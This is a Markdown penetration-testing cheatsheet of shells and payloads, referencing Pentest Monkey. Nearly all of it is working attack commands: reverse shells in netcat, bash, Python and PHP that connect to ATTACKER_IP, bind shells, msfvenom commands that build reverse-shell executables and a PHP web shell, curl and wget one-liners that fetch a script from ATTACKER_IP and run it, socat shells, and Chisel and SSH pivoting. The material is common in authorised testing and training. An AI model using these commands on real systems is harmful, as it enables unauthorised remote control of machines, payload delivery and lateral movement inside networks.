# Cheatsheet — Shells and Payloads

## Reverse Shells

| Command | Purpose |
|---------|---------|
| `nc -lvnp 4444` | Start listener |
| `nc -e /bin/sh ATTACKER_IP PORT` | Basic reverse shell (nc with -e) |
| `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'` | Bash TCP reverse shell |
| `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` | Python reverse shell |
| `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` | PHP reverse shell |

## Bind Shells

| Command | Purpose |
|---------|---------|
| `nc -lvnp PORT -e /bin/sh` | Bind shell listener |
| `socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane` | Socat bind shell with PTY |

## msfvenom Payloads

```bash
# Linux reverse shell ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell.elf

# Windows reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe -o shell.exe

# PHP web shell
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.php
```

## TTY / PTY Upgrade

| Command | Purpose |
|---------|---------|
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Spawn PTY with Python |
| `script -qc /bin/bash /dev/null` | Spawn PTY with script |
| `stty raw -echo; fg` | Terminal raw mode (after Ctrl+Z) |
| `export TERM=xterm` | Set terminal type |
| `stty rows 50 cols 132` | Set terminal size |

## Socat Fully Upgraded Shell

```bash
# Listener (attacker)
socat TCP-LISTEN:PORT,reuseaddr FILE:`tty`,raw,echo=0

# Target
socat TCP:ATTACKER_IP:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

## Payload Delivery

| Method | Command |
|--------|---------|
| curl | `curl -o /tmp/shell ATTACKER_IP/shell.sh && bash /tmp/shell` |
| wget | `wget -O /tmp/shell ATTACKER_IP/shell.sh && bash /tmp/shell` |
| Python server | `python3 -m http.server 80` |

## Pivoting / Tunneling

```bash
# Chisel - SOCKS5 proxy
# Attacker (server)
chisel server -p 8000 --reverse
# Target (client)
chisel client ATTACKER_IP:8000 R:socks

# SSH tunnel
ssh -D 1080 user@pivot-host
ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@pivot-host
ssh -R REMOTE_PORT:TARGET:TARGET_PORT user@pivot-host
```

## References

- Pentest Monkey Reverse Shell Cheatsheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
